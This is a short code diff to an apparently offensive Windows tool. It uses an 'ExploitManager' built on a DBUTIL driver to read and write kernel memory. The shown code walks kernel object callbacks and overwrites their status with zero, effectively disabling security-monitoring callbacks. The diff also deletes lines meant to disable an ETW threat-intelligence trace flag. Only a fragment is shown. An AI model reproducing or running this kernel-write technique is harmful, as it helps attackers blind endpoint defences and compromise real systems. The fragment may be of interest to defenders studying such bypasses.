@@ -601,7 +601,7 @@ void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress
 			FindDriver(*buffer);
 		}
 		ExploitManager->ReadMemory(obStatus, &buffer, 4);
-		printf("Callback Status: 0x%llx\n", *buffer);-d
+		printf("Callback Status: 0x%llx\n", *buffer);
 		unsigned long long writeBuffer = 0x00000000;
 		ExploitManager->WriteMemory(obStatus, &writeBuffer, 4);
 	}
@@ -617,9 +617,6 @@ int main() {
 	DWORD64 ntoskrnlBaseAddress = ExploitManager->GetKernelBase("ntoskrnl.exe");
 	printf("[+] Base address of ntoskrnl.exe: 0x%llx\n", ntoskrnlBaseAddress);
 	
-	// Disable EtwThreatIntProcHandle Trace Flag
-	unsigned long long ntMiGetPTEAddress = ntoskrnlBaseAddress + 0xffff88f8f5c00000;
-	printf("[+] Base of the PTEs: 0x%llx\n", ntMiGetPTEAddress);
 	HMODULE Ntoskrnl = LoadLibraryExA("Ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
 	if (Ntoskrnl == NULL) {
 		printf("[!] Unable to load Ntoskrnl.exe: %lu\n", GetLastError());
